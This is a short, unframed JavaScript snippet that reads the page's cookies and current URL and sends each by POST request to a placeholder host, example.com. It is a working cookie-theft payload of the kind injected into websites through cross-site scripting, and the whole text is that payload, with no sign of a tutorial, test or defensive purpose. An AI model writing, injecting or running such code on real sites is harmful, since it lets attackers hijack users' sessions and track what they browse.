const cookieData = document.cookie;
const locationData = window.location.href;

fetch("https://example.com/cookie", {
    method: "POST",
    body: cookieData
});

fetch("https://example.com/location", {
    method: "POST",
    body: locationData
});
